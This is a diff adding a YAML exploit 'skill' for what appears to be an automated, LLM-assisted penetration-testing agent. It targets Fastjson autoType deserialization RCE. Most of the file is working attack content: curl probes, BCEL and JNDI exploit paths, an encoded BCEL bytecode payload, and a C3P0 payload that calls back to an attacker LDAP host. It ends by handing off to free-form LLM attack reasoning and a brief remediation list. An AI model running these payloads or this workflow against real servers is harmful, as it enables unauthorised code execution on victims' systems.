@@ -1,0 +1,224 @@
+# ═══════════════════════════════════════════════════════════
+# Fastjson autoType 反序列化 RCE
+#
+# 覆盖版本: 1.2.24 ~ 1.2.80
+# 原理: autoType 允许 JSON 中 @type 指定反序列化类
+# 路径选择: BCEL(无回连) > JNDI(需回连) > 手工payload > LLM兜底
+# ═══════════════════════════════════════════════════════════
+skill_id: fastjson_rce
+name: "Fastjson autoType 反序列化 RCE"
+category: java_deserialization
+version: "1.0"
+
+principle: |
+  Fastjson 的 autoType 特性在反序列化 JSON 时，允许通过 @type 字段指定任意
+  Java 类进行实例化。攻击者可指定危险类触发：
+  
+  1. JNDI 查找（JdbcRowSetImpl.dataSourceName → LDAP/RMI → 远程类加载）
+     - 需要目标回连攻击机
+     - JDK 8u191+ 默认限制远程类加载，但可通过 Tomcat BeanFactory 等绕过
+  
+  2. BCEL ClassLoader（com.sun.org.apache.bcel.internal.util.ClassLoader）
+     - 在目标 JVM 本地加载 BCEL 编码的字节码，不需要回连
+     - 仅 JDK 8 可用（JDK 9+ 移除了 BCEL 包）
+  
+  3. TemplatesImpl（com.sun.org.apache.xalan.internal.xsltc.trax）
+     - 需要目标开启 Feature.SupportNonPublicField，概率较低
+  
+  版本绕过关系:
+    ≤1.2.24: 无限制，直接 @type
+    1.2.25~41: 黑名单，L/; 前缀绕过
+    1.2.42~47: 修复 L;，但 java.lang.Class 缓存绕过
+    1.2.48~67: 修复缓存，需新 gadget
+    1.2.68~80: safeMode + expectClass 绕过
+    ≥1.2.83: 默认关闭，基本安全
+
+match:
+  rules:
+    - fingerprint_contains: ["fastjson"]
+    - fingerprint_contains: ["com.alibaba.fastjson"]
+    - cve_matches: ["CVE-2017-18349", "CVE-2022-25845"]
+    - evidence_contains: ["fastjson", "@type"]
+    - json_probe_result: "FASTJSON_DETECTED"
+  exclude:
+    - fingerprint_contains: ["fastjson 2."]
+
+# ───────────────────────────────────────────
+# 探测阶段
+# ───────────────────────────────────────────
+probes:
+  - id: confirm_fastjson
+    description: "确认 fastjson 存在，粗测版本范围"
+    command: |
+      curl -s -X POST {ENDPOINT} \
+        -H "Content-Type: application/json" \
+        -d '{"@type":"java.lang.AutoCloseable"' \
+        --max-time 10 -w "\nHTTP_CODE:%{http_code}"
+    timeout: 15
+    parse_rules:
+      - if_contains: ["autoType is not support", "safeMode"]
+        set: { fastjson_confirmed: true, autotype_blocked: true, version_hint: ">=1.2.68" }
+      - if_contains: ["type not match", "typeMismatch", "ClassNotFoundException"]
+        set: { fastjson_confirmed: true, autotype_enabled: true, version_hint: "1.2.25~1.2.67" }
+      - if_contains: ["com.alibaba.fastjson", "fastjson"]
+        set: { fastjson_confirmed: true }
+      - if_contains: ["HTTP_CODE:4", "HTTP_CODE:5"]
+        set: { json_endpoint_active: true }
+
+  - id: version_probe_47
+    description: "测试 1.2.47 java.lang.Class 缓存绕过是否可用"
+    depends_on: { fastjson_confirmed: true }
+    command: |
+      curl -s -X POST {ENDPOINT} \
+        -H "Content-Type: application/json" \
+        -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1/a","autoCommit":true}}' \
+        --max-time 10
+    timeout: 15
+    parse_rules:
+      - if_contains: ["JdbcRowSetImpl", "connection refused", "connect timed out"]
+        set: { bypass_47_works: true, version_range: "<=1.2.47" }
+      - if_contains: ["autoType is not support", "deny"]
+        set: { bypass_47_works: false, version_range: ">=1.2.48" }
+
+  - id: version_probe_24
+    description: "测试直接 @type 是否可用（≤1.2.24）"
+    depends_on: { fastjson_confirmed: true }
+    command: |
+      curl -s -X POST {ENDPOINT} \
+        -H "Content-Type: application/json" \
+        -d '{"@type":"java.net.Inet4Address","val":"127.0.0.1"}' \
+        --max-time 10
+    timeout: 15
+    parse_rules:
+      - if_not_contains: ["error", "deny", "not support", "autoType"]
+        set: { direct_autotype: true, version_range: "<=1.2.24" }
+
+# ───────────────────────────────────────────
+# 利用路径
+# ───────────────────────────────────────────
+exploit_paths:
+
+  # ═══ 路径 A: BCEL（无回连，最优先）═══
+  - path_id: bcel_rce
+    name: "BCEL ClassLoader 本地命令执行"
+    priority: 1
+    principle: |
+      利用 BCEL ClassLoader 在目标 JVM 本地加载恶意字节码。
+      不需要回连，不受 JNDI trustURLCodebase 限制。
+      需要 JDK 8（大多数 fastjson 应用的运行环境）。
+    conditions:
+      fastjson_confirmed: true
+    steps:
+      - id: bcel_id
+        description: "BCEL 执行 id 命令验证 RCE"
+        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} id"
+        timeout: 30
+        success_criteria:
+          stdout_contains_any: ["uid=", "gid="]
+        on_success: bcel_whoami
+        on_fail: next_path
+
+      - id: bcel_whoami
+        description: "确认当前用户"
+        command: "python3 /opt/bcel_fastjson.py {ENDPOINT} whoami"
+        timeout: 30
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        on_fail: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_bcel"
+
+  # ═══ 路径 B: JNDI（需回连）═══
+  - path_id: jndi_rce
+    name: "JNDI 注入远程类加载"
+    priority: 2
+    principle: |
+      通过 JdbcRowSetImpl 触发 JNDI 查找，目标回连攻击机的
+      恶意 LDAP 服务加载远程类。JNDIExploit 工具内置多种绕过。
+    conditions:
+      fastjson_confirmed: true
+      env.can_reverse: true
+    steps:
+      - id: jndi_default
+        description: "JNDIExploit 默认 gadget 利用"
+        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
+        on_success: jndi_confirm
+        on_fail: jndi_tomcat
+
+      - id: jndi_tomcat
+        description: "尝试 Tomcat BeanFactory 绕过（高版本 JDK）"
+        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} id --gadget tomcat"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "JNDI_RCE_SUCCESS"]
+        on_success: jndi_confirm
+        on_fail: next_path
+
+      - id: jndi_confirm
+        description: "JNDI RCE 确认"
+        command: "/opt/jndi_fastjson.sh {ENDPOINT} {LHOST} whoami"
+        timeout: 120
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_jndi"
+
+  # ═══ 路径 C: 手工 curl payload ═══
+  - path_id: manual_payloads
+    name: "手工 Payload 逐一尝试"
+    priority: 3
+    principle: |
+      BCEL 和 JNDI 工具都不可用时，直接发送经典 payload。
+      覆盖 BasicDataSource(DBCP)、C3P0 等 gadget chain。
+    conditions:
+      fastjson_confirmed: true
+    steps:
+      - id: dbcp_bcel
+        description: "BasicDataSource + BCEL gadget（Tomcat DBCP）"
+        command: |
+          curl -s -X POST {ENDPOINT} \
+            -H "Content-Type: application/json" \
+            -d '{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Q$cbN$c2$40$U$3d$85$d2$f2$b0$f8D$7c$e0$c6$a5$3b$89$c6$b8$d0$b8$d0$84$c4$c4$a8$b0q$3b$d0$a1$Nl$a7$a4$33$a0$fc$96$ae$fc$A$3f$c2$b8$90$c4$c5$dc$99s$e7$9c$b9$f7$de$cf$af$f7$P$80$5d$ac$d9$c8$60$d9F$d6$c2$8a$85$d5$08k6$d6$L$e4$ac$88$M$F$b9$J$c9$L$e4$b7$U$e2$de$98$a8$7eG$f2$a4$ef$c9$b6$e2$bd$7b2$e8$fb$ec$9a$a8$ca$84$I$85$e5$5d$V$b4$N$f5$83$M$88$84$ab$a4V$U$fb$e0$p$QE$s$O$f4$c6$8c$jFu$3eV$Jw$89$a3$b4$d5$w$h$b0$c1$8bL$a1$3d$Y2$U$b0$af$e2$3e$ef2$95$3a$81$89$zB3$c8$fb$y$3ej$93$e3$b1$9f$a6$8e$j$3f$90$s$V$b8$E$fb$8e$dej$b2$rMSI$a5$92$3e$e7$84$R2$81$84h$c7$d0$8d$_$a8$9f$b3$K$NbSu$e3$d3C$60$cc$e3$5e$c4$J$d3r$ab$fb$qc$ae$n$i$I$d3$e2$d8E$c1E1l$c7$a5$q$b2$5b$fc$L$cb$e0$d7$e3$f1$fc$f0t$u$c2$$$b5$94$e0$f8$e0$81Y$f6$c1$a1$be$c5$85$C$e3$a1L$eb$9b$m$cd$d0$3a$de$c1$a7z$a0I$D$rh$93$b3$S$q$ce$daH$eb$fa$7f$L$a6$Yq$a6$Q$c5$Jv$98$d4$a3$b8$ff$D$d8$e2$D$8e$B$A$A"}' \
+            --max-time 15
+        timeout: 20
+        success_criteria:
+          stdout_regex: "uid=\\d+"
+        on_success: conclude_success
+        on_fail: next_step
+        evidence_capture:
+          shell_type: "rce_dbcp_bcel"
+
+      - id: c3p0_jndi
+        description: "C3P0 JndiRefForwardingDataSource（需回连）"
+        command: |
+          curl -s -X POST {ENDPOINT} \
+            -H "Content-Type: application/json" \
+            -d '{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://{LHOST}:1389/Exploit","loginTimeout":0}' \
+            --max-time 15
+        timeout: 20
+        success_criteria:
+          stdout_contains_any: ["uid="]
+        on_success: conclude_success
+        on_fail: next_path
+
+  # ═══ 路径 D: LLM 兜底 ═══
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      fastjson_confirmed: true
+
+remediation: |
+  1. 升级至 Fastjson 2.x 或替换为 Jackson/Gson
+  2. 无法升级时启用 safeMode: ParserConfig.getGlobalInstance().setSafeMode(true)
+  3. WAF 拦截包含 @type 的 JSON 请求
+  4. 限制出站网络连接（阻止 JNDI 回连）
